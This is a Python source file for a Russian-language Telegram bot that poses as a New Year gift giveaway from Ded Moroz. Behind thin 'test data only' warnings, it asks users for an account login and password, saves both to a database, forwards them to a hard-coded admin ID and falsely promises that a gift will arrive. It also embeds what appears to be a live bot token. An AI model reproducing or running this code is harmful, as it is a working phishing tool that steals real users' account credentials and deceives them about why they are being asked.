import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
import sqlite3
from datetime import datetime, timedelta

# === НАСТРОЙКИ ===
BOT_TOKEN = "8418052441:AAEyIvxgmYbR6V83sNir0Nsk234mW4VsWGw"
ADMIN_ID = 8000395560  # Замените на ваш Telegram ID
CHANNEL_USERNAME = "@pnixmcbe"
CREATOR_USERNAME = "@isnikson"

# Состояния для ConversationHandler
ENTER_LOGIN, ENTER_PASSWORD = range(2)

# === ИНИЦИАЛИЗАЦИЯ БАЗЫ ДАННЫХ ===
def init_db():
    conn = sqlite3.connect('newyear_bot.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            message_count INTEGER DEFAULT 0,
            last_message_time TIMESTAMP,
            is_banned BOOLEAN DEFAULT FALSE,
            ban_until TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS gift_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            login TEXT,
            password TEXT,
            timestamp TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

init_db()

# === ЛОГИРОВАНИЕ ===
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# === ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===
def update_antispam(user_id):
    conn = sqlite3.connect('newyear_bot.db')
    cursor = conn.cursor()
    now = datetime.now()
    
    cursor.execute('SELECT message_count, last_message_time FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if result:
        message_count, last_message_time = result
        last_message_time = datetime.fromisoformat(last_message_time) if last_message_time else now
        if (now - last_message_time).total_seconds() > 60:
            message_count = 1
        else:
            message_count += 1
    else:
        message_count = 1
        cursor.execute(
            'INSERT INTO users (user_id, message_count, last_message_time) VALUES (?, ?, ?)',
            (user_id, message_count, now.isoformat())
        )
    
    cursor.execute(
        'UPDATE users SET message_count = ?, last_message_time = ? WHERE user_id = ?',
        (message_count, now.isoformat(), user_id)
    )
    conn.commit()
    conn.close()
    return message_count <= 10

def is_user_banned(user_id):
    conn = sqlite3.connect('newyear_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT is_banned, ban_until FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result and result[0]:
        if result[1]:
            ban_until = datetime.fromisoformat(result[1])
            if datetime.now() > ban_until:
                unban_user(user_id)
                return False
        return True
    return False

def ban_user(user_id, reason):
    conn = sqlite3.connect('newyear_bot.db')
    cursor = conn.cursor()
    ban_until = (datetime.now() + timedelta(days=30)).isoformat()
    cursor.execute(
        'INSERT OR REPLACE INTO users (user_id, is_banned, ban_until) VALUES (?, ?, ?)',
        (user_id, True, ban_until)
    )
    conn.commit()
    conn.close()

def unban_user(user_id):
    conn = sqlite3.connect('newyear_bot.db')
    cursor = conn.cursor()
    cursor.execute(
        'UPDATE users SET is_banned = FALSE, ban_until = NULL WHERE user_id = ?',
        (user_id,)
    )
    conn.commit()
    conn.close()

def save_gift_log(user_id, username, login, password):
    conn = sqlite3.connect('newyear_bot.db')
    cursor = conn.cursor()
    cursor.execute(
        'INSERT INTO gift_logs (user_id, username, login, password, timestamp) VALUES (?, ?, ?, ?, ?)',
        (user_id, username, login, password, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

def get_bot_stats():
    conn = sqlite3.connect('newyear_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users')
    total_users = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM gift_logs')
    total_gifts = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM users WHERE is_banned = TRUE')
    banned_users = cursor.fetchone()[0]
    conn.close()
    return {
        'total_users': total_users,
        'total_gifts': total_gifts,
        'banned_users': banned_users
    }

async def notify_admin(message):
    from telegram.ext import Application
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        await app.bot.send_message(ADMIN_ID, message)
    except Exception as e:
        logging.error(f"Ошибка отправки админу: {e}")

# === КОМАНДЫ И ОБРАБОТЧИКИ ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    if is_user_banned(user_id):
        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return

    welcome_text = f"""
🎅 Добро пожаловать в Новогодний Бот Подарков! 🎄

✨ Подарок от Деда Мороза уже ждёт вас!

📢 Наш канал: {CHANNEL_USERNAME}  
👨‍💻 Создатель: {CREATOR_USERNAME}

🎁 Чтобы получить **новогодний подарок**, введите данные тестового аккаунта.

⚠️ ВНИМАНИЕ: Используйте **только фейковые или тестовые данные**!  
Настоящие логины и пароли — **нельзя**!
    """
    
    keyboard = [
        [KeyboardButton("🎁 Получить новогодний подарок")],
        [KeyboardButton("📢 Наш канал"), KeyboardButton("👨‍💻 Создатель")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)
    context.user_data.clear()

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    text = update.message.text

    if is_user_banned(user_id):
        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return

    if not update_antispam(user_id):
        await ban_user(user_id, "Спам (более 10 сообщений в минуту)")
        await update.message.reply_text("❌ Вы забанены за спам!")
        await notify_admin(
            f"🚨 Пользователь забанен за спам:\n"
            f"ID: {user_id}\n"
            f"Username: @{user.username if user.username else 'N/A'}\n"
            f"Имя: {user.first_name}"
        )
        return

    if text == "🎁 Получить новогодний подарок":
        await start_gift_process(update, context)
    elif text == "📢 Наш канал":
        await update.message.reply_text(f"📢 Подписывайтесь на наш канал: {CHANNEL_USERNAME}")
    elif text == "👨‍💻 Создатель":
        await update.message.reply_text(f"👨‍💻 Наш создатель: {CREATOR_USERNAME}")
    else:
        await update.message.reply_text("🤔 Используйте кнопки для навигации!")

async def start_gift_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    if is_user_banned(user_id):
        await update.message.reply_text("❌ Вы забанены.")
        return

    await update.message.reply_text(
        "🎅 Дед Мороз просит логин вашего аккаунта для вручения подарка:\n"
        "⚠️ Используйте **только фейковые данные**!"
    )
    return ENTER_LOGIN

async def enter_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    if is_user_banned(user_id):
        return ConversationHandler.END

    context.user_data['login'] = update.message.text
    context.user_data['in_gift_process'] = True

    await update.message.reply_text(
        "🔑 Теперь введите пароль:\n"
        "⚠️ Только тестовые данные! Настоящие — нельзя!"
    )
    return ENTER_PASSWORD

async def enter_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    if is_user_banned(user_id):
        return ConversationHandler.END

    password = update.message.text
    login = context.user_data.get('login', 'N/A')

    save_gift_log(user_id, user.username, login, password)

    admin_msg = (
        "🎁 НОВЫЙ НОВОГОДНИЙ ПОДАРОК! 🎄\n"
        f"👤 Пользователь: @{user.username if user.username else 'N/A'}\n"
        f"🆔 ID: {user_id}\n"
        f"📛 Имя: {user.first_name}\n"
        f"🔑 Логин: {login}\n"
        f"🔒 Пароль: {password}\n"
        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    await notify_admin(admin_msg)

    await update.message.reply_text(
        "🎉 Ура! Подарок от Деда Мороза принят!\n"
        "❄️ Он появится в вашем аккаунте в ближайшее время!\n"
        "⚠️ Напоминаем: использованы **тестовые данные** — так и должно быть!"
    )
    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("❌ Получение подарка отменено.")
    return ConversationHandler.END

# === АДМИНСКИЕ КОМАНДЫ ===
async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ У вас нет прав.")
        return
    if not context.args:
        await update.message.reply_text("Использование: /ban <user_id> [причина]")
        return
    try:
        user_id = int(context.args[0])
        reason = " ".join(context.args[1:]) or "Не указана"
        await ban_user(user_id, reason)
        await update.message.reply_text(f"✅ Пользователь {user_id} забанен.\nПричина: {reason}")
    except ValueError:
        await update.message.reply_text("❌ Неверный ID.")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("Использование: /unban <user_id>")
        return
    try:
        user_id = int(context.args[0])
        unban_user(user_id)
        await update.message.reply_text(f"✅ Пользователь {user_id} разбанен.")
    except ValueError:
        await update.message.reply_text("❌ Неверный ID.")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    stats = get_bot_stats()
    await update.message.reply_text(
        "📊 Статистика бота:\n"
        f"👥 Всего пользователей: {stats['total_users']}\n"
        f"🎁 Подарков выдано: {stats['total_gifts']}\n"
        f"🚫 Забанено: {stats['banned_users']}"
    )

# === ЗАПУСК ===
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    gift_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("🎁 Получить новогодний подарок"), start_gift_process)],
        states={
            ENTER_LOGIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_login)],
            ENTER_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(gift_conv)
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🎄 Новогодний бот запущен! С Наступающим!")
    application.run_polling()

if __name__ == '__main__':
    main()